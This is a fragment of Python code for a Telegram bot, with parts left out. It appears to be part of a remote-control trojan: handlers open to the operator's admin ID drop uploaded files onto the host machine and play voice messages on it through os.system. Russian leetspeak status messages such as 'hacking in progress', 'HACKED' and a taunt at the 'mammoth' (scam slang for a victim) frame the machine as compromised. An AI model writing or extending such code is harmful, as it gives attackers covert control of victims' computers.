...
""", reply_markup=buttons, parse_mode='HTML')
        ...
        async def download(message: types.Message):
            if message.from_user.id == admin_id:
                try:
                    msg = await bot.send_message(message.from_user.id, "ВЗЛ0М происходит...")
                    file_id = message.document.file_id
                    file = await bot.get_file(file_id)
                    file_path = file.file_path
                    await bot.download_file(file_path, message.document.file_name)
                    await bot.edit_message_text('В3Л0МАНО ✅', admin_id, msg.message_id)
        ...
        async def audio(message: types.Message):
            if message.from_user.id == admin_id:
                try:
                    msg = await bot.send_message(message.from_user.id, "СЕЙЧАС МАМОНТ УСЛЫШNT ШNM...")
                    file_id = message.voice.file_id
                    file = await bot.get_file(file_id)
                    file_path = file.file_path
                    await bot.download_file(file_path, message.voice.file_unique_id + '.ogg')
                    os.system(message.voice.file_unique_id + '.ogg')
                    await bot.edit_message_text('УСПЕШН0 ЗАПУСТNV ШNM ✅', admin_id, msg.message_id)
                except Exception as e:
                    await bot.send_message(admin_id, e)
